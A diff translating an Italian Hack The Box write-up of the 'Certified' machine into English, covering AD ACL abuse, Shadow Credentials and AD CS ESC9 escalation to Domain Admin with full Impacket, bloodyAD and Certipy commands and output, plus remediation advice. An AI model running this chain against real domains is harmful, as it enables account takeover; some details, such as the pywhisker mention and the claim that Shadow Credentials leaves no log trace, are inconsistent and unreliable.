@@ -1,43 +1,43 @@
 ---
-title: Certified
+title: "Certified — English"
 date: 2026-01-18 00:00:00 +0100
 categories: [CTF, HTB]
 tags: [active-directory, adcs, esc9, shadow-credentials, bloodhound]
-lang: it-IT
+lang: en
 toc: true
 mermaid: true
 description: >-
-  Sfruttamento di ACL Active Directory, Shadow Credentials e ADCS ESC9
-  per ottenere privilegi Domain Admin.
+  Active Directory ACL abuse, Shadow Credentials, and AD CS ESC9
+  exploitation to obtain Domain Admin privileges.
 ---
 
-<nav class="language-switcher" aria-label="Lingua dell’articolo">
-  <span class="is-current" aria-current="page">IT</span>
-  <a href="{{ '/posts/certified-english/' | relative_url }}" lang="en">EN</a>
+<nav class="language-switcher" aria-label="Article language">
+  <a href="{{ '/posts/certified/' | relative_url }}" lang="it">IT</a>
+  <span class="is-current" aria-current="page">EN</span>
 </nav>
 
 
 ## 🎯 Executive Summary
 
-**Certified** è una macchina Windows di difficoltà media progettata attorno a uno scenario di “assumed breach” (violazione presunta), dove vengono fornite le credenziali per un utente con privilegi limitati.  
+**Certified** is a medium-difficulty Windows machine built around an assumed-breach scenario, where credentials for a low-privileged user are provided.  
 ( **judith.mader** : **judith09** )
 
-| Attributo       | Valore                                                                                                                        |
+| Attribute | Value |
 |:----------------|:------------------------------------------------------------------------------------------------------------------------------|
-| **OS:**         | Windows                                                                                                                       |
-| **Difficulty:** | Medium                                                                                                                        |
+| **OS:**         | Windows
+| **Difficulty:** | Medium
 | **MITRE TTPs:** | ![T1558](https://img.shields.io/badge/T1558-Kerberoasting-orange) ![T1649](https://img.shields.io/badge/T1649-ADCS_Abuse-red) |
 
-> Obiettivo
+> Objective
 >
-> **Accesso Iniziale (Foothold):** L’obiettivo iniziale è ottenere l’accesso all’account *management_svc*. Questo avviene enumerando le ACL (Access Control Lists) sugli oggetti privilegiati. L’enumerazione rivela che l’utente fornito, *judith.mader* possiede il permesso `WriteOwner` sul gruppo management. A sua volta, il gruppo management possiede il permesso `GenericWrite` sull’account *management_svc*, permettendo infine l’autenticazione al target tramite WinRM.  
-> **Escalation dei Privilegi:** Per ottenere l’accesso all’account Administrator è necessario sfruttare l’Active Directory Certificate Service (ADCS). La tecnica specifica prevede l’abuso delle “`Shadow Credentials`” e lo sfruttamento della vulnerabilità `ESC9`. L’attacco ESC9 permette di modificare l’UPN (User Principal Name) di un utente (in questo caso *ca_operator*) in “Administrator”, richiedere un certificato per quell’UPN e poi autenticarsi come Amministratore di Dominio.
+> **Initial Access (Foothold):** The first objective is to compromise *management_svc*. ACL enumeration shows that *judith.mader* has `WriteOwner` over the Management group, which in turn has `GenericWrite` over *management_svc*. This chain ultimately enables WinRM authentication to the target.
+> **Privilege Escalation:** Administrator access requires abusing Active Directory Certificate Services (AD CS), specifically Shadow Credentials and ESC9. The attack changes the UPN of *ca_operator* to “Administrator”, requests a certificate for that UPN, and then authenticates as a Domain Admin.
 
 ```mermaid
 flowchart TD
-    A[Accesso Iniziale] -->|User: Judith| B(PrivEsc: management_svc)
+    A[Initial Access] -->|User: Judith| B(PrivEsc: management_svc)
     B -->|Shadow Credentials| C(Admin: CA Operator)
-    C -->|Vulnerabilità ESC9| D[Domain Admin]
+    C -->|ESC9 Vulnerability| D[Domain Admin]
     style D fill:#f700ff,stroke:#00ff41,stroke-width:2px,color:#fff
 ```
 
@@ -45,9 +45,9 @@ flowchart TD
 
 ## Reconnaissance
 
-### Enumerazione
+### Enumeration
 
-Scansione di Rete
+Network scan
 
 ```
 sudo nmap --open -v T4 -A -Pn 10.129.231.186
@@ -141,11 +141,11 @@ HOP RTT      ADDRESS
 2   66.87 ms 10.129.231.186
 ```
 
-L’analisi iniziale con `nmap` identifica l’host **10.129.231.186** come il Domain Controller **DC01** del dominio `certified.htb`.
+The initial analysis with `nmap` identifies the host **10.129.231.186** as the Domain Controller **DC01** the domain `certified.htb`.
 
-- **Servizi AD:** Sono esposti i servizi standard di Active Directory: DNS (53), Kerberos (88), RPC (135), LDAP (389/3268) e LDAPS (636/3269).
-- **ADCS:** L’output dello script LDAP rivela la presenza di una Certification Authority denominata `certified-DC01-CA`, indizio fondamentale per possibili vettori di attacco sui certificati.
-- **Accesso Remoto:** Sono aperti SMB (445) e WinRM (5985).
+- **AD services:** The standard services of Active Directory: DNS (53), Kerberos (88), RPC (135), LDAP (389/3268) and LDAPS (636/3269).
+- **ADCS:** LDAP script output reveals the presence of a Certification Authority called `certified-DC01-CA`, fundamental clue for possible attack vectors on certificates.
+- **Remote access:** They're open SMB (445) and WinRM (5985).
 
 ------------------------------------------------------------------------
 
@@ -173,22 +173,22 @@ WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019
 WINRM       10.129.231.186  5985   DC01             [-] certified.htb\judith.mader:judith09
 ```
 
-**Verifica Credenziali e Accessi**
+**Credentials and Access**
 
-Disponendo delle credenziali per l’utente `judith.mader`, verifichiamo i permessi di accesso ai servizi esposti.
+Having user credentials `judith.mader`, we verify access permits to the services exposed.
 
-- **SMB:** L’autenticazione ha successo. `NetExec` conferma che le credenziali sono valide, ma l’utente ha accesso solo in lettura alle share predefinite (`IPC$`, `NETLOGON`, `SYSVOL`).
-- **WinRM:** Il tentativo di connessione remota fallisce; l’utente non fa parte del gruppo *Remote Management Users*.
+- **SMB:** Authentication is successful. `NetExec` confirms that the credentials are valid, but the user has access only in reading to the default share (`IPC$`, `NETLOGON`, `SYSVOL`).
+- **WinRM:** Remote connection attempt fails; the user is not part of the group *Remote Management Users*.
 
 ------------------------------------------------------------------------
 
-**Analisi Active Directory** (BloodHound)
+**Analysis Active Directory** (BloodHound)
 
-L’enumerazione delle ACL del dominio tramite BloodHound evidenzia un percorso di compromissione interessante che parte dall’utente controllato.
+The enumeration of domain ACLs through BloodHound highlights an interesting compromise path that starts with a controlled user.
 
 ![100%](/assets/img/posts/certified/bloodhound.png)
 
-L’analisi mostra che `judith.mader` dispone di privilegi critici sul gruppo **Management** (o può acquisirli), permettendo la modifica dei membri o del proprietario del gruppo stesso. Questo controllo sarà il punto di partenza per l’escalation dei privilegi.
+The analysis shows that `judith.mader` has critical privileges on the group **Management** (or can acquire them), allowing the change of members or the owner of the group itself. This control will be the starting point for the escalation of privileges.
 
 ------------------------------------------------------------------------
 
@@ -196,11 +196,11 @@ L’analisi mostra che `judith.mader` dispone di privilegi critici sul gruppo **
 
 ### Exploitation & Lateral Movement
 
-**Abuso dei Permessi AD** (ACL Abuse)
+**Abuse of AD Permissions** ACL Abuse
 
-L’analisi BloodHound ha rivelato che `judith.mader` possiede i privilegi necessari per manipolare il gruppo **Management**. Procediamo modificando le ACL per aggiungerci al gruppo e ottenere ulteriori accessi.
+The analysis BloodHound has revealed that `judith.mader` possesses the necessary privileges to manipulate the group **Management**. We proceed by modifying the ACLs to add to the group and obtain additional access.
 
-1.  **Presa di possesso (Ownership):** Utilizziamo `impacket-owneredit` per assegnare la proprietà dell’oggetto gruppo **Management** all’utente `judith.mader`.
+1.  **Holder (Ownership):** We use `impacket-owneredit` to assign the property of the group object **Management** to the user `judith.mader`.
 
 ```
 impacket-owneredit -action write -new-owner 'judith.mader' -target management 'certified/judith.mader':'judith09' -dc-ip 10.129.231.186
@@ -213,7 +213,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] OwnerSid modified successfully!
 ```
 
-2.  **Modifica DACL:** Con `impacket-dacledit` ci garantiamo il permesso `WriteMembers` sull’oggetto.
+2.  **Edit DACL:** With `impacket-dacledit` we guarantee permission `WriteMembers` on the object.
 
 ```
 impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.129.231.186
@@ -223,7 +223,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL modified successfully!
 ```
 
-3.  **Aggiunta al gruppo:** Infine, tramite `bloodyAD`, aggiungiamo il nostro utente al gruppo **Management**. Una verifica con `net rpc` conferma che ora `judith.mader` è membro effettivo.
+3.  **Added to the group:** Finally, through `bloodyAD`, we add our user to the group **Management**. A verification with `net rpc` confirm that now `judith.mader` is an effective member.
 
 ```
 bloodyAD --host dc01.certified.htb -d certified.htb -u 'judith.mader' -p 'judith09' add groupMember 'Management' 'judith.mader'
@@ -238,16 +238,16 @@ CERTIFIED\management_svc
 
 ### Shadow Credentials Attack
 
-L’appartenenza al gruppo **Management** ci fornisce il controllo sull’utente di servizio **management_svc**. Per compromettere questo account senza modificarne la password (operazione rumorosa e distruttiva), eseguiamo un attacco **Shadow Credentials**.
+Group membership **Management** provides us with control over the service user **management_svc**. To compromise this account without changing the password (noise and destructive operation), we execute an attack **Shadow Credentials**.
 
-Questa tecnica abusa dell’attributo `msDS-KeyCredentialLink` per iniettare una chiave pubblica, permettendo l’autenticazione tramite certificato e l’ottenimento di un TGT Kerberos.
+This technique abuses the attribute `msDS-KeyCredentialLink` to inject a public key, allowing certificate authentication and obtaining a TGT Kerberos.
 
-Eseguiamo l’attacco con **Certipy** (utilizzando `faketime` per correggere il disallineamento orario di +7h rilevato da nmap):
+We carry out the attack with **Certipy** (using `faketime` to correct the +7h time misalignment detected by nmap):
 
-1.  Certipy inietta una *Key Credential* nell’account `management_svc`.
-2.  Effettua l’autenticazione con il certificato generato.
-3.  Recupera l’hash NT dell’account (`a091...`).
-4.  Ripristina lo stato originale rimuovendo la chiave iniettata.
+1.  Certipy injects a *Key Credential* in the account `management_svc`.
+2.  Authenticate with the certificate generated.
+3.  Recovers account NT (`a091...`).
+4.  Restores the original state by removing the injected key.
 
 ```
 faketime -f +7h certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
@@ -274,25 +274,25 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
 ```
 
-**Shadow Credentials** è una tecnica di attacco ad Active Directory che consente di **impersonare un account senza conoscerne la password**, abusando dell’attributo `msDS-KeyCredentialLink`.
+**Shadow Credentials** is a technique of attack to Active Directory that allows you to **impersonate an account without knowing the password**, abuse of attribute `msDS-KeyCredentialLink`.
 
-Se un attaccante dispone di permessi di scrittura su questo attributo (diretti o tramite ACL/gruppi), può **aggiungere una propria chiave pubblica** all’account target. Active Directory accetterà quindi tale chiave come **metodo di autenticazione valido**, permettendo l’ottenimento di un **TGT Kerberos** tramite certificato.
+If an attacker has written permissions on this attribute (direct or via ACL/groups), it may **add your own public key** to the target account. Active Directory will therefore accept such key as **valid authentication method**, allowing the obtainment of a **TGT Kerberos** via certificate.
 
-Questa tecnica:
+This technique:
 
-- non modifica la password dell’account
-- è poco visibile a livello di logging
-- viene spesso usata come **pivot verso ADCS o Domain Admin**
+- does not change your account password
+- is not visible at the logging level
+- is often used as **Pivot towards ADCS or Domain Admin**
 
-> Nel nostro caso, l’abuso di Shadow Credentials ha permesso di ottenere l’ **NT hash** dell’account `ca_operator`, abilitando la successiva escalation tramite Active Directory Certificate Services.
+> In our case, the abuse of Shadow Credentials allowed to obtain the **NT hash** of the account `ca_operator`, enabling subsequent escalation via Active Directory Certificate Services.
 
 ------------------------------------------------------------------------
 
-### Accesso come management_svc
+### Access management_svc
 
-Con l’hash NTLM recuperato, otteniamo una shell WinRM stabile sull’host target e recuperiamo il primo flag.
+With the recovered hash, we get a shell WinRM stable on the target host and we recover the first flag.
 
-- **Utente:** `management_svc`
+- **User:** `management_svc`
 - **Flag:** `user.txt`
 
 ```
@@ -315,11 +315,11 @@ Mode                LastWriteTime         Length Name
 
 ------------------------------------------------------------------------
 
-## Privilage Escalation (ADCS ESC9)
+## Privilege Escalation (AD CS ESC9)
 
-### Pivot verso ca_operator
+### Pivot towards ca_operator
 
-L’enumerazione interna con BloodHound mostra che l’utente `management_svc` ha controllo sull’account `ca_operator`. Sfruttiamo nuovamente la tecnica **Shadow Credentials** per ottenere l’hash NTLM di questo utente necessario per interagire con la Certification Authority.
+The internal enumeration with BloodHound shows that the user `management_svc` has account control `ca_operator`. We use the technique again **Shadow Credentials** to obtain the hash NTLM of this user necessary to interact with the Certification Authority.
 
 ![100%](/assets/img/posts/certified/bloodhound-2.png)
 
@@ -350,15 +350,15 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ------------------------------------------------------------------------
 
-### Identificazione Vulnerabilità ESC9
+### Vulnerability identification ESC9
 
-L’analisi dei template di certificato con `certipy find` evidenzia il template `CertifiedAuthentication` vulnerabile a **ESC9**. Le condizioni critiche rilevate sono:
+Certificate template analysis with `certipy find` highlight the template `CertifiedAuthentication` vulnerable to **ESC9**. Critical conditions are:
 
-- **Permessi di Enrollment:** L’utente `operator ca` (ca_operator) ha diritti di enrollment.
-- **Mancanza Security Extension:** Il template non ha l’estensione di sicurezza (`msPKI-Certificate-Security-Extension`), quindi il certificato non incorpora il SID del richiedente.
-- **Identità basata su UPN:** Il flag `SubjectAltRequireUpn` impone che l’identità del certificato sia mappata sul `userPrincipalName` dell’account Active Directory.
+- **Enrollment permits:** The user `operator ca` (ca_operator) has enrollment rights.
+- **Lack of Security Extension:** The template has no security extension (`msPKI-Certificate-Security-Extension`), therefore the certificate does not incorporate the applicant's SID.
+- **Identity based on UPN:** The flag `SubjectAltRequireUpn` imposes that the identity of the certificate is mapped on `userPrincipalName` of the account Active Directory.
 
-Questa configurazione permette a chi può modificare il proprio UPN (o quello di un utente controllato) di impersonare chiunque, incluso l’Administrator.
+This configuration allows anyone who can change their own UPN (or that of a controlled user) to impersonate another account, including Administrator.
 
 ```
 certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout
@@ -456,11 +456,11 @@ Certificate Templates
       ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 ```
 
-**Esecuzione dell’Attacco**
+**Execution of Attack**
 
-Poiché `management_svc` ha permessi di scrittura sugli attributi di `ca_operator`, eseguiamo i seguenti passaggi:
+For `management_svc` has writing permissions on attributes of `ca_operator`, we do the following steps:
 
-1.  **Modifica UPN:** Cambiamo il `userPrincipalName` di `ca_operator` in `Administrator`.
+1.  **Edit UPN:** Let's change the `userPrincipalName` of `ca_operator` in `Administrator`.
 
 ```
 certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
@@ -471,7 +471,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_operator'
 ```
 
-2.  **Richiesta Certificato:** Richiediamo un certificato usando il template `CertifiedAuthentication`. La CA, leggendo l’UPN modificato, emette un certificato valido per “Administrator”.
+2.  **Certificate Request:** Request a certificate using the `CertifiedAuthentication` template. The CA reads the modified UPN and issues a valid certificate for “Administrator”.
 
 ```
 certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
@@ -487,7 +487,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-3.  **Ripristino:** Reimpostiamo l’UPN originale (`ca_operator@certified.htb`) per pulire le tracce e mantenere la coerenza dell’account.
+3.  **Restoration:** Restore the original UPN (`ca_operator@certified.htb`) to reduce artifacts and preserve account consistency.
 
 ```
 certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
@@ -498,7 +498,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_operator'
 ```
 
-4.  **Autenticazione:** Utilizziamo il certificato `administrator.pfx` ottenuto per autenticarci via Kerberos (Unlocking) e recuperare l’hash NTLM dell’account **Administrator**.
+4.  **Authentication:** We use the certificate `administrator.pfx` obtained to authenticate us via Kerberos (Unlocking) and recover the account’s hash NTLM **Administrator**.
 
 ```
 faketime -f +7h certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
@@ -515,19 +515,19 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
 ```
 
-**ESC9** è una vulnerabilità di Active Directory Certificate Services che si verifica quando un certificate template non include la **Security Extension**. In questa configurazione, i certificati emessi non sono legati al **SID dell’account**, ma si basano esclusivamente sul **UPN** per l’identità.
+**ESC9** is a vulnerability to Active Directory Certificate Services that occurs when a certified template does not include **Security Extension**. In this configuration, certificates issued are not related to **Account SID**, but are based solely on **UPN** for identity.
 
-Se un attaccante dispone dei permessi di **Enroll** su un template vulnerabile e può modificare il **UPN** dell’account, è possibile richiedere un certificato impersonando un altro utente, incluso **Administrator**. Il certificato ottenuto può quindi essere utilizzato per autenticarsi via Kerberos e ottenere privilegi di **Domain Admin**.
+If an attacker has permissions **Enroll** on a vulnerable template and can edit **UPN** of the account, you can request a certificate by impersonating another user, including **Administrator**. The certificate obtained can then be used to authenticate via Kerberos and obtain privileges of **Domain Admin**.
 
-Nel contesto di questa macchina, ESC9 ha permesso l’ottenimento di un certificato valido per l’account Administrator, completando l’escalation dei privilegi.
+In the context of this machine, ESC9 a valid certificate for the account Administrator, completing the escalation of privileges.
 
 ------------------------------------------------------------------------
 
-### Accesso Root
+### Administrator Access
 
-Con l’hash dell’amministratore, accediamo via `evil-winrm` e conquistiamo il dominio.
+With the administrator’s hash, let’s go `evil-winrm` and we conquer the domain.
 
-- **Utente:** `Administrator`
+- **User:** `Administrator`
 - **Flag:** `root.txt`
 
 ```
@@ -552,23 +552,23 @@ Mode                LastWriteTime         Length Name
 
 ## 🛡️ Remediation & Defense
 
-L’intera catena di attacco su **Certified** si basa su una scarsa igiene delle ACL di Active Directory e su configurazioni insicure dei servizi di certificato (ADCS). Ecco le azioni correttive prioritarie.
+The entire attack chain on **Certified** is based on poor hygiene of ACLs Active Directory and insecure configurations of certificate services (ADCS). Here are the priority corrective actions.
 
-> Fix Critico: Mitigazione ADCS (ESC9/UPN Spoofing)
+> Fix Critical: Mitigation ADCS (ESC9/UPN Spoofing)
 >
-> L’attacco finale sfrutta la possibilità di modificare il proprio `userPrincipalName` (UPN) per ingannare la CA e ottenere un certificato come Administrator.
+> The final attack takes advantage of the possibility to change its own `userPrincipalName` (UPN) to deceive the CA and get a certificate as Administrator.
 >
-> **Azione Correttiva:**
+> **Corrective action:**
 >
-> 1.  **Abilitare Strong Certificate Binding:** Implementare la patch Microsoft **KB5014754**. Questa impone un mapping forte (Strong Mapping) tra il certificato e l’utente basato sul SID, rendendo inutile il trucco del cambio UPN.
-> 2.  **Revisione Template:** Se il template non richiede la compatibilità con client legacy, rimuovere il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` se presente o restringere i permessi di enrollment solo agli amministratori.
+> 1.  **Enable Strong Certificate Binding:** Implement Microsoft patch **KB5014754**. This imposes a strong mapping (Strong Mapping) between the certificate and the user based on the SID, making the change makeup useless UPN.
+> 2.  **Template Review:** If the template does not require compatibility with legacy clients, remove the flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` if present or restrict enrollment permissions to administrators only.
 
-> Hardening delle ACL & Monitoraggio
+> ACL Hardening & Monitoring
 >
-> Per prevenire il movimento laterale iniziale, è necessario intervenire a monte:
+> To prevent the initial lateral movement, it is necessary to intervene upstream:
 >
-> 1.  **Principio del Privilegio Minimo (PoLP):** L’utente `judith.mader` non dovrebbe avere il permesso **WriteOwner** su un gruppo privilegiato come `Management`. Il gruppo `Management` non deve avere permessi **GenericWrite** o **GenericAll** sugli account di servizio (`management_svc`) o sugli operatori della CA (`ca_operator`).  
->     ***Soluzione:** Eseguire audit periodici con strumenti come **PingCastle** o **BloodHound** per identificare e rimuovere relazioni di trust pericolose.*  
-> 2.  **Rilevamento Shadow Credentials:** L’attacco ha utilizzato `pywhisker` per iniettare Key Credentials. **Detection:** *Monitorare le modifiche all’attributo `msDS-KeyCredentialLink` sugli oggetti utente e computer.*  
->     **Event ID:** *Configurare alert per l’Evento Windows **4742** (Computer Account Changed) o **4738** (User Account Changed) quando viene popolato questo attributo specifico.*  
-> 3.  **Protezione Account Critici:** Account come `ca_operator` dovrebbero essere protetti tramite il gruppo **Protected Users** o marcati come “Account is sensitive and cannot be delegated” per limitare le superfici di attacco Kerberos.
+> 1.  **Principle of Privilegio Minimo (PoLP):** The user `judith.mader` should not have permission **WriteOwner** on a privileged group as `Management`. The group `Management` must not have allowed **GenericWrite** or **GenericAll** on service accounts (`management_svc`) or on CA operators (`ca_operator`).  
+>     ***Solution:** Perform periodic audits with tools such as **PingCastle** or **BloodHound** to identify and remove dangerous trust relationships.*  
+> 2.  **Detection Shadow Credentials:** The attack used `pywhisker` to inject Key Credentials. **Detection:** *Monitoring changes to the attribute `msDS-KeyCredentialLink` on user objects and computers.*  
+>     **Event ID:** *Configure alert for the Windows Event **4742** (Computer Account Changed) or **4738** (User Account Changed) when this specific attribute is populated.*  
+> 3.  **Critical Account Protection:** Accounts `ca_operator` should be protected through the group **Protected Users** or marked as “Account is sensitive and cannot be delegated” to limit Kerberos attack surfaces.
